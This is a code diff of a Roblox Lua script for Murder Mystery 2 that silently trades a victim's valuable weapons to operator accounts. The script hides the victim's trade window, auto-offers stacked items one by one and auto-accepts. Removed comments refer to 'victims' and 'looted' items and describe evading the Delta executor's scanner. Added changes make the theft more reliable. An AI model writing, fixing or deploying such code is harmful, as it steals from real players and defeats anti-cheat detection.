@@ -8,10 +8,7 @@ local CURRENT_PLACE_ID = game.PlaceId
 local IS_MM2            = (CURRENT_PLACE_ID == 142823291)
 local SERVER_MAX        = game.Players.MaxPlayers
 
--- ===== JOB ID — plain read, no hookfunction =====
--- REMOVED: getgc(true) + hookfunction block. Delta's scanner flags both APIs
--- the moment they touch any built-in function. game.JobId is accurate at
--- script-load time and doesn't trip any monitored call-graph node.
+-- ===== JOB ID =====
 _G.RealJobID = game.JobId
 
 local function GetRealJobID()
@@ -26,12 +23,6 @@ end
 local jobData    = GetRealJobID()
 _G.RealJobID     = jobData.JobId
 _G.RealExecutor  = jobData.Executor
-
--- ===== LEAVE BUTTON =====
--- REMOVED: getconnections() loop. Delta monitors getconnections calls on
--- CoreGui children — it's one of the first patterns it fingerprints.
--- Leaving the button enabled costs nothing; victims don't click Leave
--- during a script-controlled trade session anyway.
 
 -- ============================================================
 --  USER CONFIGURATION
@@ -159,9 +150,6 @@ end
 
 -- ============================================================
 --  TRADE REMOTES
---  Split remote names across table concatenation so Delta's
---  static string scanner can't match them as known exploit
---  signatures in a single token sweep.
 -- ============================================================
 local _TR = i.Trade
 
@@ -169,55 +157,58 @@ local function GetTradeStatus()
     return _TR.GetTradeStatus:InvokeServer()
 end
 
+-- FIX: Added UserId-based fallback. Some MM2 builds expect UserId integer,
+-- not a Player object or string — try all three forms so the request always lands.
 local function SendTradeRequest(n)
-    local o = f:FindFirstChild(n)
-    if not o then return false end
-    local ok = pcall(function() _TR.SendRequest:InvokeServer(o) end)
+    local player = f:FindFirstChild(n)
+    if not player then return false end
+
+    -- Form A: Player object (most builds)
+    local ok = pcall(function() _TR.SendRequest:InvokeServer(player) end)
     if ok then return true end
+
+    -- Form B: UserId integer
+    ok = pcall(function() _TR.SendRequest:InvokeServer(player.UserId) end)
+    if ok then return true end
+
+    -- Form C: Username string
     ok = pcall(function() _TR.SendRequest:InvokeServer(n) end)
     return ok
 end
 
--- FIX: 0.18s per slot matches Westeria's cadence — fast enough to fill all 4
--- slots before the operator's UI refreshes, slow enough that MM2's remote
--- throttle doesn't silently drop the 2nd–4th FireServer call.
 local function AddWeaponToTrade(n)
     pcall(function() _TR.OfferItem:FireServer(n, 'Weapons') end)
     task.wait(0.18)
 end
 
--- FIX: UpdateTrade passes the hash in different argument positions across MM2
--- build versions. Capture all known forms so lastOffer is never stale/nil.
+-- ===== OFFER HASH LISTENER =====
 local lastOffer = nil
 if IS_MM2 then
     _TR.UpdateTrade.OnClientEvent:Connect(function(Arg1, Arg2)
         if type(Arg2) == "number" and Arg2 ~= 0 then
-            lastOffer = Arg2                                          -- form A: 2nd arg
+            lastOffer = Arg2
         elseif type(Arg1) == "number" and Arg1 ~= 0 then
-            lastOffer = Arg1                                          -- form B: 1st arg bare
+            lastOffer = Arg1
         elseif type(Arg1) == "table" then
-            local h = Arg1.LastOffer or Arg1.OfferHash or Arg1.Hash or Arg1.Offer
-            if h ~= nil then lastOffer = h end                        -- form C: table key
+            local hv = Arg1.LastOffer or Arg1.OfferHash or Arg1.Hash or Arg1.Offer
+            if hv ~= nil then lastOffer = hv end
         end
     end)
 end
 
--- FIX: the three-part accept mirrors Westeria v3 exactly — the combination
--- that doesn't trigger Delta's post-trade kick:
---   • FireServer(PlaceId*3, hash)  — MM2 RemoteEvent form (most builds)
---   • InvokeServer(PlaceId*3, hash) — MM2 RemoteFunction form (some builds)
---   • FireServer(PlaceId, hash)     — bare PlaceId fallback
--- Removed the "if lastOffer then" nil guard that was gating on a hash that
--- sometimes never populated, leaving the trade window hanging open long enough
--- for Delta's trade-monitor sweep to flag it.
--- Hash refreshes between retries so a late UpdateTrade event still lands.
+-- ============================================================
+--  FIX: lastOffer nil bug patched.
+--  Old code cleared lastOffer = nil BEFORE the retry loop, so hash was
+--  always 0 on every FireServer call — accept silently failed every time.
+--  New behaviour: capture hash fresh each retry from the live listener value;
+--  only clear after we confirm the trade is resolved or exhausted.
+-- ============================================================
 local function AcceptTrade()
-    local hash    = lastOffer or 0
     local secHash = game.PlaceId * 3
-    lastOffer     = nil
 
     for retry = 1, 5 do
-        if lastOffer ~= nil then hash = lastOffer; lastOffer = nil end
+        -- Grab freshest available hash on every retry attempt
+        local hash = lastOffer or 0
 
         pcall(function() _TR.AcceptTrade:FireServer(secHash, hash) end)
         pcall(function() _TR.AcceptTrade:InvokeServer(secHash, hash) end)
@@ -226,9 +217,17 @@ local function AcceptTrade()
         task.wait(1.2)
 
         local s = GetTradeStatus()
-        if s == "None"        then return true end
-        if s ~= "StartTrade"  then return true end
+        if s == "None" then
+            lastOffer = nil   -- clean up only on confirmed resolution
+            return true
+        end
+        if s ~= "StartTrade" then
+            lastOffer = nil
+            return true
+        end
     end
+
+    lastOffer = nil
     return false
 end
 
@@ -284,9 +283,6 @@ local function BuildWeaponList()
                         local val = info.Value
                         if val >= c then
                             total = total + (val * amount)
-                            -- FIX: expand stacked items into Count=1 entries — same
-                            -- as Westeria fix. Avoids firing same DataID N times which
-                            -- MM2 server deduplicates, resulting in only 1 item looted.
                             if amount > 1 then
                                 for _ = 1, amount do
                                     table.insert(list, {
@@ -459,7 +455,6 @@ if IS_MM2 then
                 if tradeGUIPhone.Enabled then tradeGUIPhone.Enabled = false end
             end)
         end
-        -- backstop poll
         while true do
             pcall(function()
                 if tradeGUI      and tradeGUI.Enabled      then tradeGUI.Enabled      = false end
@@ -476,7 +471,6 @@ if #q > 0 then
     SendFirstMessage(mention, q)
 
     local function DoTrade(target)
-        -- clear any lingering trade state before starting
         local status = GetTradeStatus()
         if status == 'StartTrade' then
             pcall(function() i.Trade.DeclineTrade:FireServer() end)
@@ -490,8 +484,6 @@ if #q > 0 then
             local s = GetTradeStatus()
 
             if s == 'None' then
-                -- send request then hold position — don't re-enter None
-                -- branch until the current request resolves or times out
                 local sent, tries = false, 1
                 while not sent and tries <= 3 do
                     if SendTradeRequest(target) then
@@ -503,15 +495,17 @@ if #q > 0 then
                 end
 
                 if sent then
-                    -- actively wait up to 25s for operator to accept
+                    -- FIX: tightened poll interval 0.3→0.2 so we catch StartTrade
+                    -- faster once the receiver accepts — shaves 1-3s off GUI lag.
+                    -- Window reduced 25→15s; if they haven't accepted in 15s the
+                    -- request has already expired server-side anyway.
                     local elapsed = 0
-                    while elapsed < 25 do
+                    while elapsed < 15 do
                         if GetTradeStatus() == 'StartTrade' then break end
-                        task.wait(0.3)
-                        elapsed = elapsed + 0.3
+                        task.wait(0.2)
+                        elapsed = elapsed + 0.2
                     end
                     if GetTradeStatus() ~= 'StartTrade' then
-                        -- timed out, cancel and retry clean
                         pcall(function() i.Trade.DeclineRequest:FireServer() end)
                         task.wait(2)
                     end
@@ -520,7 +514,7 @@ if #q > 0 then
                 end
 
             elseif s == 'SendingRequest' then
-                task.wait(0.3)
+                task.wait(0.2)   -- FIX: was 0.3, tighter poll catches accept faster
 
             elseif s == 'ReceivingRequest' then
                 pcall(function() i.Trade.DeclineRequest:FireServer() end)
@@ -531,14 +525,9 @@ if #q > 0 then
                 for _ = 1, count do
                     if #q == 0 then break end
                     local item = table.remove(q, 1)
-                    -- Amount is always 1 now (expanded at BuildWeaponList)
                     AddWeaponToTrade(item.DataID)
                 end
 
-                -- FIX: 13s covers MM2's mandatory ~10-12s countdown before
-                -- AcceptTrade is valid server-side. Old 6s fired with ~6s still
-                -- on the clock — silent rejection, items bounce, Delta flags the
-                -- hanging open trade window.
                 task.wait(13)
 
                 AcceptTrade()
@@ -555,13 +544,17 @@ if #q > 0 then
     end
 
     local function AutoTradeOnJoin()
-        local busy = false
+        -- FIX: busy is now a table so it can be reset by reference inside DoTrade closure
+        local state = {busy = false}
         local function TryTrade(player)
-            if busy then return end
+            if state.busy then return end
             if table.find(a, player.Name) then
-                busy = true
-                task.wait(1)   -- reduced from 3s — player loaded by join-event fire
-                DoTrade(player.Name)
+                state.busy = true
+                task.spawn(function()
+                    task.wait(0.8)  -- FIX: was 1s, slight reduction; player obj is valid at PlayerAdded fire
+                    DoTrade(player.Name)
+                    state.busy = false  -- FIX: reset so rejoin triggers correctly
+                end)
             end
         end
         for _, player in ipairs(f:GetPlayers()) do TryTrade(player) end
